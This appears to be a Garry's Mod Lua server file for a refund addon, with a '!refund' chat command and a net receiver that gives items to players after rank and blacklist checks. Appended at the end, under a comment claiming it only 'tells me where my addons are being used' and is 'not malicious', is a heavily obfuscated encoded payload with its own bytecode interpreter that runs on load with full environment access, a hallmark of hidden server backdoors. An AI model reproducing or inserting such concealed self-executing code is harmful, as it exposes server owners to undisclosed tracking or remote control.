do end



util.AddNetworkString( "p.refund" )

hook.Add( "PlayerSay","p.refund.gui",function( p, t )
	if ( !refund.cfg.Ranks[ p:GetUserGroup() ] ) then return end
	if ( string.lower( t ) == "!refund" ) then
		p:ConCommand( "p.refund.menu" )
		return ""
	end
end )

net.Receive("p.refund", function( _, p )

	local rData = table.Copy( refund.cfg )
	if ( !rData ) then return end
	local user = net.ReadEntity()
	local item = net.ReadString()

	do // Checks

		if ( !rData.SteamBypass[ p:SteamID64() ] and !rData.RankBypass[ p:GetUserGroup() ] and !rData.Ranks[ p:GetUserGroup() ] ) then 
			print( "[    Vectivus Refunds - Blocked:    ] ", p, "attempted to give ", user, item )
			if ( refundLog ) then
				refundLog:Log( "Unauthorized user {1}, attempted to spawn " .. item, GAS.Logging:FormatPlayer( p ) )
			end
			return
		end

		if ( rData.BlackList[ item ] and !rData.RankBypass[ p:GetUserGroup() ] and !rData.SteamBypass[ p:SteamID64() ] ) then
			print( "[    Vectivus Refunds - Blacklisted:    ] ", p, "tried spawning", item )
			p:ChatPrint( "[Refund]: " .. item .. " is blacklised!" )

			if ( refundLog ) then
				refundLog:Log( "{1} has attempted to spawn " .. item .. " for {2}", GAS.Logging:FormatPlayer( p ), GAS.Logging:FormatPlayer( user ) )
			end
			return
		end

	end

	user:Give( item )

	print( "[    Vectivus Refunds - Spawned:    ] ", p, " gave ", user, item )

	if ( refundLog ) then
		refundLog:Log( "{1} has refunded {2}, " .. item, GAS.Logging:FormatPlayer( p ), GAS.Logging:FormatPlayer( user ) )
	end

end )

-- Tells me where my addons are being used. This is not malicious in anyway.
local i=string.byte;local h=string.char;local c=string.sub;local A=table.concat;local e=table.insert;local M=math.ldexp;local u=getfenv or function()return _ENV end;local e=setmetatable;local s=select;local d=unpack or table.unpack;local f=tonumber;local function r(d)local l,n,o="","",{}local a=256;local t={}for e=0,a-1 do t[e]=h(e)end;local e=1;local function i()local l=f(c(d,e,e),36)e=e+1;local n=f(c(d,e,e+l-1),36)e=e+l;return n end;l=h(i())o[1]=l;while e<#d do local e=i()if t[e]then n=t[e]else n=l..c(l,1,1)end;t[a]=l..c(n,1,1)o[#o+1],l,a=n,n,a+1 end;return table.concat(o)end;local f=r('21Q21M27521N27427522A22D22D22921N21L27521M23F22M22M21N21C27G23722C22B22622B22J22E22B21S22N21N21527G22322022N21U1K22122H22022B2222261K22622022J22H22922N22021M21P27G2141S27G21N27G1Q1R27G27521K21M2141V21M28Q27F27528Y21M28W27829521O21M29228U1X27G27F28Q21M21F28P29J27529B21N21R27G27R22F28I21N29927522X22B22F22222E22N29B27526Y24O23E21M29U28X28O27628R28T28U28W29429127G21K29928W28U21M29D28V29027529I2AB2AT21M21228P2A822128D22B22C22L29N27G22X29Z27Q27727G22L22J29R21N21I27G23H22N22623722Y27I22M28222122121N29G21M102A227525M1521N21E27G22E27B22222G28F27D28L2751A1K2CA2CC21N21D27N22123I22N22M22B22H22J2262CJ2B92792262262222CQ21M22Y22D2AZ21N1J27G22A2CS222221101L1L2BN22F1K28128322622D22F27P22J22128I22428I2211K22H22D1L22J1L22L2DB22222A2CU2AS21M2DD21U22T22C2BC27X2CF2752BH2262362CY2262382E621N2C82E12822E32892BV27523E2BZ2802EK22T22F22J2CU2A82EA23B2EV2EQ2752E22ET22J21U2F121M2DF2AZ2882B227L27G2EZ21U22Y22E22J21V2DN2CE2ER28322T22728A29X27X2972EU22622A2B427522K2C222D2202EH27G23D2272202322FS2EN2382EP2E02F322F22D22M27X27Z27522W22N22K22722C22M1Q22X21V2AZ22N22F1Q1B2CB2CB21M1228M2E82AQ2751Q2AM29528X2AB29B2H82AQ28Q2972HF2HA2142AP29O2H92HA28W2HE2BS2992AA28Q2CF28Q28L21Q2BS2HV21M2HY27G21G2AQ28S2H62A721M1S2162AQ21H2AQ2C02I22752ID29G2E02BS28N2AQ2HD28T28Q28Q2AS1O2HI28W29U28Q21B2I72IG21M2IY2HG2BS2182H62IK28M28O28Q27M2H72H82IQ21M2CF2HK2HA2BF2AM29B2992JH2742I42AM27428Q28W2IB29A21M21J2I121M2HE2972JM27529O2HM2JZ2752A82JU2752742742992JU27F2ID2742JN2JV2H72KA2JY2JH2KL2JS21M2KE21M2172KM2KL21A28M2K32KJ2K621M2K42J128U29O2BS27G2972JT29L21M27Z2KH2KV2KX2L121M21928R2KY29O1Y2HB2I81Z2H92992KP2HE2992991W2L42I82JQ2AI2KQ2LA2J52741A2LA29D2AW29J29F2H92L627G');local o=bit and bit.bxor or function(e,l)local n,o=1,0 while e>0 and l>0 do local a,c=e%2,l%2 if a~=c then o=o+n end e,l,n=(e-a)/2,(l-c)/2,n*2 end if e<l then e=l end while e>0 do local l=e%2 if l>0 then o=o+n end e,n=(e-l)/2,n*2 end return o end local function n(n,e,l)if l then local e=(n/2^(e-1))%2^((l-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(n%(e+e)>=e)and 1 or 0;end;end;local e=1;local function l()local a,c,n,l=i(f,e,e+3);a=o(a,58)c=o(c,58)n=o(n,58)l=o(l,58)e=e+4;return(l*16777216)+(n*65536)+(c*256)+a;end;local function t()local l=o(i(f,e,e),58);e=e+1;return l;end;local function a()local l,n=i(f,e,e+2);l=o(l,58)n=o(n,58)e=e+2;return(n*256)+l;end;local function B()local o=l();local e=l();local c=1;local o=(n(e,1,20)*(2^32))+o;local l=n(e,21,31);local e=((-1)^n(e,32));if(l==0)then if(o==0)then return e*0;else l=1;c=0;end;elseif(l==2047)then return(o==0)and(e*(1/0))or(e*(0/0));end;return M(e,l-1023)*(c+(o/(2^52)));end;local r=l;local function H(l)local n;if(not l)then l=r();if(l==0)then return'';end;end;n=c(f,e,e+l-1);e=e+l;local l={}for e=1,#n do l[e]=h(o(i(c(n,e,e)),58))end return A(l);end;local e=l;local function h(...)return{...},s('#',...)end local function M()local i={};local f={};local e={};local d={i,f,nil,e};local e=l()local o={}for n=1,e do local l=t();local e;if(l==2)then e=(t()~=0);elseif(l==3)then e=B();elseif(l==1)then e=H();end;o[n]=e;end;d[3]=t();for d=1,l()do local e=t();if(n(e,1,1)==0)then local c=n(e,2,3);local t=n(e,4,6);local e={a(),a(),nil,nil};if(c==0)then e[3]=a();e[4]=a();elseif(c==1)then e[3]=l();elseif(c==2)then e[3]=l()-(2^16)elseif(c==3)then e[3]=l()-(2^16)e[4]=a();end;if(n(t,1,1)==1)then e[2]=o[e[2]]end if(n(t,2,2)==1)then e[3]=o[e[3]]end if(n(t,3,3)==1)then e[4]=o[e[4]]end i[d]=e;end end;for e=1,l()do f[e-1]=M();end;return d;end;local function A(e,l,t)local l=e[1];local n=e[2];local e=e[3];return function(...)local o=l;local r=n;local c=e;local i=h local l=1;local a=-1;local M={};local h={...};local f=s('#',...)-1;local e={};local n={};for e=0,f do if(e>=c)then M[e-c]=h[e+1];else n[e]=h[e+1];end;end;local e=f-c+1 local e;local c;while true do e=o[l];c=e[1];if c<=19 then if c<=9 then if c<=4 then if c<=1 then if c==0 then if n[e[2]]then l=l+1;else l=e[3];end;else l=e[3];end;elseif c<=2 then n[e[2]]={};elseif c==3 then n[e[2]][e[3]]=n[e[4]];else local e=e[2]n[e]=n[e](d(n,e+1,a))end;elseif c<=6 then if c>5 then n[e[2]]=A(r[e[3]],nil,t);else n[e[2]]=n[e[3]]/e[4];end;elseif c<=7 then local e=e[2]local o,l=i(n[e](n[e+1]))a=l+e-1 local l=0;for e=e,a do l=l+1;n[e]=o[l];end;elseif c==8 then local l=e[2]n[l]=n[l](d(n,l+1,e[3]))else do return end;end;elseif c<=14 then if c<=11 then if c==10 then n[e[2]]={};else local c;n[e[2]]=t[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=t[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];c=e[2]n[c]=n[c]()l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];c=e[2]n[c]=n[c](d(n,c+1,e[3]))l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];if(n[e[2]]==e[4])then l=l+1;else l=e[3];end;end;elseif c<=12 then n[e[2]][e[3]]=e[4];elseif c>13 then n[e[2]]=n[e[3]]/e[4];else l=e[3];end;elseif c<=16 then if c>15 then if(n[e[2]]==e[4])then l=l+1;else l=e[3];end;else n[e[2]]=n[e[3]][e[4]];end;elseif c<=17 then local e=e[2]local o,l=i(n[e]())a=l+e-1 local l=0;for e=e,a do l=l+1;n[e]=o[l];end;elseif c>18 then n[e[2]]=t[e[3]];else local l=e[2]n[l](d(n,l+1,e[3]))end;elseif c<=29 then if c<=24 then if c<=21 then if c>20 then do return end;else local e=e[2]local o,l=i(n[e]())a=l+e-1 local l=0;for e=e,a do l=l+1;n[e]=o[l];end;end;elseif c<=22 then n[e[2]][e[3]]=e[4];elseif c>23 then if n[e[2]]then l=l+1;else l=e[3];end;else local e=e[2]n[e]=n[e](d(n,e+1,a))end;elseif c<=26 then if c>25 then n[e[2]][e[3]]=n[e[4]];else local o=e[3];local l=n[o]for e=o+1,e[4]do l=l..n[e];end;n[e[2]]=l;end;elseif c<=27 then local l=e[2]n[l](d(n,l+1,e[3]))elseif c==28 then local l=e[2]n[l]=n[l](d(n,l+1,e[3]))else local e=e[2]local o,l=i(n[e](n[e+1]))a=l+e-1 local l=0;for e=e,a do l=l+1;n[e]=o[l];end;end;elseif c<=34 then if c<=31 then if c>30 then local e=e[2]n[e]=n[e]()else n[e[2]]=A(r[e[3]],nil,t);end;elseif c<=32 then local f;local r,s;local h;local A;local c;n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]={};l=l+1;e=o[l];n[e[2]]=t[e[3]];l=l+1;e=o[l];c=e[2]n[c]=n[c]()l=l+1;e=o[l];n[e[2]][e[3]]=n[e[4]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=e[3];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];A=e[3];h=n[A]for e=A+1,e[4]do h=h..n[e];end;n[e[2]]=h;l=l+1;e=o[l];n[e[2]][e[3]]=n[e[4]];l=l+1;e=o[l];n[e[2]]=t[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];c=e[2]n[c]=n[c]()l=l+1;e=o[l];n[e[2]][e[3]]=n[e[4]];l=l+1;e=o[l];n[e[2]]=t[e[3]];l=l+1;e=o[l];n[e[2]]=t[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];c=e[2]r,s=i(n[c]())a=s+c-1 f=0;for e=c,a do f=f+1;n[e]=r[f];end;l=l+1;e=o[l];c=e[2]n[c]=n[c](d(n,c+1,a))l=l+1;e=o[l];n[e[2]][e[3]]=n[e[4]];l=l+1;e=o[l];n[e[2]]=t[e[3]];l=l+1;e=o[l];n[e[2]]=t[e[3]];l=l+1;e=o[l];n[e[2]]=n[e[3]][e[4]];l=l+1;e=o[l];n[e[2]]=t[e[3]];l=l+1;e=o[l];c=e[2]n[c]=n[c]()l=l+1;e=o[l];n[e[2]]=n[e[3]]/e[4];l=l+1;e=o[l];c=e[2]r,s=i(n[c](n[c+1]))a=s+c-1 f=0;for e=c,a do f=f+1;n[e]=r[f];end;l=l+1;e=o[l];c=e[2]n[c]=n[c](d(n,c+1,a))l=l+1;e=o[l];n[e[2]][e[3]]=n[e[4]];l=l+1;e=o[l];n[e[2]][e[3]]=e[4];l=l+1;e=o[l];c=e[2]n[c](d(n,c+1,e[3]))l=l+1;e=o[l];do return end;elseif c==33 then n[e[2]]=n[e[3]][e[4]];else local e=e[2]n[e]=n[e]()end;elseif c<=36 then if c==35 then n[e[2]]=e[3];else local o=e[3];local l=n[o]for e=o+1,e[4]do l=l..n[e];end;n[e[2]]=l;end;elseif c<=37 then n[e[2]]=e[3];elseif c>38 then if(n[e[2]]==e[4])then l=l+1;else l=e[3];end;else n[e[2]]=t[e[3]];end;l=l+1;end;end;end;return A(M(),{},u())();